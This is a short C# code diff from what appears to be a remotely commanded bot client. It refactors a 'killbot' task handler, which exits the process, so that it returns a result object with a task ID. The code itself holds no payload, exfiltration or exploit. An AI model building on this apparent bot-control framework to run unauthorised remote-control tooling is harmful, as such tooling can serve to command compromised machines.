@@ -8,10 +8,14 @@ namespace pattaya_project_client.Commands.Implements
     {
         public override string TaskName => "killbot";
 
-        public override string RunTask(BotTask task)
+        public override BotTaskResult RunTask(BotTask task)
         {
             Environment.Exit(0);
-            return "Bot has been killed";
+            return new BotTaskResult
+            {
+                TaskId = task.TaskId,
+                Result = "Bot has been killed"
+            };
         }
     }
 }
